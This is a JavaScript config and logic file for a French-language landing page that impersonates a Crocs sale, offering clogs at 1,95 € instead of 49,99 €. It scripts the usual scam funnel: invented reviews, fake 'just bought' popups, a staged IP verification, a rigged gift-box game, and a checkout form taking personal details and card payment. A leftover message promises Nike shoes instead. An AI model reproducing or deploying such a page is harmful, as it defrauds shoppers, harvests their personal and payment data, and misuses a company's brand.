const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: true,
    selectText: "TAILLE : ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menu",
    account: "Se connecter",
    heart: "Liste de souhaits",
    bag: "Panier",
    find: "Rechercher"
  };

  const mainProduct = {
    header: "Offre limitée",
    name: "Classic Clog",
    oldPrice: "49,99 €",
    newPrice: "1,95 €",
    selectText: "COULEUR : ",
    text: `Profitez d'un ajustement sur mesure, résistant à l'eau et avec une ventilation pour une meilleure respirabilité. Les Crocs
          Classic sont les chaussures parfaites pour toutes les occasions. Entièrement moulées en matériau Croslite™.
<br></br>
          Incroyablement légères et super amusantes aux pieds.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Rome, Italie",
      action: "Je viens de recevoir les Clogs pour 1,95 euros !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Carlos B******",
      location: "Milan, Italie",
      action: "Je viens de recevoir les Clogs pour 1,95 euros !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Il y a un jour",
      header: "C'est incroyable !",
      product: "26468781",
      review: "“J'adore mes Crocs Classic Clogs ! Ils sont incroyablement confortables et idéaux pour marcher et jardiner. Légers et faciles à nettoyer 😊",
      image: "./index_files/review1.jpg",
    },
    {
      name: "Lucas",
      time: "Il y a deux jours",
      header: "Génial ! Je n'ai pas de mots.",
      product: "26468783",
      review: "J'ai acheté les Crocs pour la plage, mais maintenant je les porte tous les jours. Confortables, ils n'irritent pas et les pieds ne transpirent pas. Excellent choix",
      image: "./index_files/review2.jpg",
    },
    {
      name: "Valentina",
      time: "Il y a deux jours",
      header: "Simplement génial.",
      product: "26468782",
      review: "Ma fille adore les Crocs avec les Jibbitz colorés. Non seulement ils sont mignons, mais aussi confortables. Convient pour l'école et les excursions.",
      image: "./index_files/review3.jpg",
    },
    {
      name: "Santiago",
      time: "Il y a quatre jours",
      header: "J'aime",
      product: "26468782",
      review: "Au début, j'étais sceptique, mais après la première utilisation, j'ai compris pourquoi tout le monde les aime tellement. Incroyablement confortables et légers. Excellent achat !",
      image: "./index_files/review4.jpg",
    },
    {
      name: "Martina",
      time: "Il y a sept jours",
      header: "Wow, j'adore ce produit !",
      product: "26468783",
      review: "J'adore les Crocs ! Ils sont si doux et confortables que je peux les porter toute la journée sans me fatiguer. Idéal pour les voyages et les longues promenades. Je les recommande à tous !",
      image: "./index_files/review5.jpg",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET CRITIQUES",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} de {2} : ",
    arr: [
      {
        q: "Avez-vous déjà utilisé nos produits ?",
        a: [
          "Oui, j'achète souvent",
          "Oui, j'achète rarement",
          "Je n'ai jamais acheté",
        ],
      },
      {
        q: "Nous recommanderiez-vous à vos amis ?",
        a: ["Oui, absolument !", "Oui, mais changez le design des crocs.", "Non"],
      },
      {
        q: "Quelle couleur de Crocs est la plus populaire cette année ?",
        a: ["Noir", "Vert", "Blanc", "Rouge"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera vérifiée...",
    arr: [
      "Vous avez répondu à la question 3/3.",
      "Votre adresse IP ne permet pas de tirer des conclusions sur les demandes précédentes.",
      "Votre réponse a été vérifiée.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Félicitations, vous avez confirmé que vous êtes une personne réelle",
        button: "OK",
        text: `
        <center>
       Aujourd'hui, {date}, vous avez la possibilité d'acheter une paire de chaussures Nike Air Force 1'07 à un prix spécial
          <br><br>
         Tout ce que vous avez à faire est de choisir la bonne boîte cadeau.
          <br><br>
      Vous avez 3 tentatives, bonne chance !
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "OK",
        text: `
        <center>
    Malheureusement, ce cadeau est vide ! Il vous reste encore 2 tentatives - bonne chance !
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Félicitations ! Vous avez gagné !",
        button: "OK",
        text: `
        <center>
          <p style="color: #000">
       Vous avez gagné une paire de chaussures "Nike Air Force 1'07"
          </p>
          <br>
            1) Cliquez sur "OK" pour aller à la page de livraison.
            <br><br>
            2) Remplissez le formulaire et payez la commande en utilisant votre réduction personnelle.
            <br><br>
            3) Le paquet sera livré en 2-3 jours.
        </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Méthodes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la commande",
      oldPrice: "49,99 €",
      newPrice: "1,95 €",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "1,95 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Payez votre commande",
    },
  };



  const products = [
    {
      id: "26468781",
      name: "Black",
      miniImg: "./index_files/img/item1/item1.jpg",
      images: [
        "./index_files/img/item1/item1.jpg",
        "./index_files/img/item1/item2.jpg",
        "./index_files/img/item1/item3.jpg",
        "./index_files/img/item1/item4.jpg",
        "./index_files/img/item1/item5.jpg",
        "./index_files/img/item1/item6.jpg",
      ],
    },
    {
      id: "26468782",
      name: "Juice",
      miniImg: "./index_files/img/item2/item1.jpg",
      images: [
        "./index_files/img/item2/item1.jpg",
        "./index_files/img/item2/item2.jpg",
        "./index_files/img/item2/item3.jpg",
      ],
    },
    {
      id: "26468783",
      name: "White",
      miniImg: "./index_files/img/item3/item1.jpg",
      images: [
        "./index_files/img/item3/item1.jpg",
        "./index_files/img/item3/item2.jpg",
        "./index_files/img/item3/item3.jpg",
        "./index_files/img/item3/item4.jpg",
        "./index_files/img/item3/item5.jpg",
        "./index_files/img/item3/item6.jpg",
      ],
    },
    {
      id: "26468784",
      name: "Aciditys",
      miniImg: "./index_files/img/item4/item1.jpg",
      images: [
        "./index_files/img/item4/item1.jpg",
        "./index_files/img/item4/item2.jpg",
        "./index_files/img/item4/item3.jpg",
        "./index_files/img/item4/item4.jpg",
        "./index_files/img/item4/item5.jpg",
        "./index_files/img/item4/item6.jpg",
      ],
    },
    {
      id: "26468785",
      name: "Lavender",
      miniImg: "./index_files/img/item5/item1.jpg",
      images: [
        "./index_files/img/item5/item1.jpg",
        "./index_files/img/item5/item2.jpg",
        "./index_files/img/item5/item3.jpg",
        "./index_files/img/item5/item4.jpg",
        "./index_files/img/item5/item5.jpg",
        "./index_files/img/item5/item6.jpg",
      ],
    },
    {
      id: "26468786",
      name: "Green Ivy",
      miniImg: "./index_files/img/item6/item1.jpg",
      images: [
        "./index_files/img/item6/item1.jpg",
        "./index_files/img/item6/item2.jpg",
        "./index_files/img/item6/item3.jpg",
        "./index_files/img/item6/item4.jpg",
        "./index_files/img/item6/item5.jpg",
        "./index_files/img/item6/item6.jpg",
      ],
    },
    {
      id: "26468787",
      name: "Bone",
      miniImg: "./index_files/img/item7/item1.jpg",
      images: [
        "./index_files/img/item7/item1.jpg",
        "./index_files/img/item7/item2.jpg",
        "./index_files/img/item7/item3.jpg",
        "./index_files/img/item7/item4.jpg",
      ],
    },
    {
      id: "26468788",
      name: "Arctic",
      miniImg: "./index_files/img/item8/item1.jpg",
      images: [
        "./index_files/img/item8/item1.jpg",
        "./index_files/img/item8/item2.jpg",
        "./index_files/img/item8/item3.jpg",
        "./index_files/img/item8/item4.jpg",
        "./index_files/img/item8/item5.jpg",
        "./index_files/img/item8/item6.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© 2024 Crocs, Inc.",
  };

  const pathImgBox = {
    lid: "./index_files/box-lid.png",
    lidIOs: "./index_files/box-lid-ios.png",
    inner: "./index_files/box-inner.png",
    innerGift: "./index_files/box-inner-gift.png",
    box: "./index_files/box.png",
    boxModal: "./index_files/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
